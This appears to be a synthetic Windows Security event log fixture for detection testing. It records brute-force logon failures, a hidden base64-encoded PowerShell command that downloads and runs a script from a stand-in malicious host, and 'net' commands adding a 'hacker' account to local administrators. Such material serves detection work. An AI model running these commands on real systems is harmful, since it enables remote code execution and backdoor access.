[
  {
    "TimeCreated": "2024-01-15T08:00:00Z",
    "EventID": 4624,
    "Computer": "WORKSTATION01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "jsmith",
    "TargetDomainName": "CORP",
    "IpAddress": "10.0.0.51",
    "LogonType": 10,
    "LogonProcessName": "User32",
    "AuthenticationPackageName": "Negotiate",
    "WorkstationName": "WORKSTATION01",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T08:30:00Z",
    "EventID": 4688,
    "Computer": "WORKSTATION01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "SubjectUserName": "jsmith",
    "SubjectDomainName": "CORP",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c whoami",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "TokenElevationType": "%%1936",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T09:00:00Z",
    "EventID": 4625,
    "Computer": "DC01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "administrator",
    "TargetDomainName": "CORP",
    "IpAddress": "192.168.1.200",
    "LogonType": 3,
    "Status": "0xc000006d",
    "SubStatus": "0xc000006a",
    "FailureReason": "Unknown user name or bad password",
    "Keywords": "Audit Failure"
  },
  {
    "TimeCreated": "2024-01-15T09:00:05Z",
    "EventID": 4625,
    "Computer": "DC01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "administrator",
    "TargetDomainName": "CORP",
    "IpAddress": "192.168.1.200",
    "LogonType": 3,
    "Status": "0xc000006d",
    "SubStatus": "0xc000006a",
    "FailureReason": "Unknown user name or bad password",
    "Keywords": "Audit Failure"
  },
  {
    "TimeCreated": "2024-01-15T09:00:10Z",
    "EventID": 4625,
    "Computer": "DC01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "administrator",
    "TargetDomainName": "CORP",
    "IpAddress": "192.168.1.200",
    "LogonType": 3,
    "Status": "0xc000006d",
    "SubStatus": "0xc000006a",
    "FailureReason": "Unknown user name or bad password",
    "Keywords": "Audit Failure"
  },
  {
    "TimeCreated": "2024-01-15T09:15:00Z",
    "EventID": 4688,
    "Computer": "WORKSTATION02",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "SubjectUserName": "attacker",
    "SubjectDomainName": "CORP",
    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBwAGEAeQBsAG8AYQBkACcAKQA=",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "TokenElevationType": "%%1937",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T09:16:00Z",
    "EventID": 4688,
    "Computer": "WORKSTATION02",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "SubjectUserName": "attacker",
    "SubjectDomainName": "CORP",
    "NewProcessName": "C:\\Windows\\System32\\net.exe",
    "CommandLine": "net user hacker Password123! /add",
    "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TokenElevationType": "%%1937",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T09:16:30Z",
    "EventID": 4688,
    "Computer": "WORKSTATION02",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "SubjectUserName": "attacker",
    "SubjectDomainName": "CORP",
    "NewProcessName": "C:\\Windows\\System32\\net.exe",
    "CommandLine": "net localgroup administrators hacker /add",
    "ParentProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "TokenElevationType": "%%1937",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T09:17:00Z",
    "EventID": 4720,
    "Computer": "WORKSTATION02",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "hacker",
    "TargetDomainName": "WORKSTATION02",
    "SubjectUserName": "attacker",
    "SubjectDomainName": "CORP",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T09:17:30Z",
    "EventID": 4732,
    "Computer": "WORKSTATION02",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "hacker",
    "TargetDomainName": "WORKSTATION02",
    "MemberSid": "S-1-5-21-...-1001",
    "TargetSid": "S-1-5-32-544",
    "SubjectUserName": "attacker",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T10:00:00Z",
    "EventID": 4624,
    "Computer": "SERVER01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "TargetUserName": "svc_backup",
    "TargetDomainName": "CORP",
    "IpAddress": "10.0.0.100",
    "LogonType": 3,
    "LogonProcessName": "NtLmSsp",
    "AuthenticationPackageName": "NTLM",
    "Keywords": "Audit Success"
  },
  {
    "TimeCreated": "2024-01-15T11:00:00Z",
    "EventID": 4648,
    "Computer": "WORKSTATION01",
    "Channel": "Security",
    "Provider": "Microsoft-Windows-Security-Auditing",
    "SubjectUserName": "jsmith",
    "SubjectDomainName": "CORP",
    "TargetUserName": "administrator",
    "TargetDomainName": "CORP",
    "TargetServerName": "DC01",
    "ProcessName": "C:\\Windows\\System32\\runas.exe",
    "Keywords": "Audit Success"
  }
]
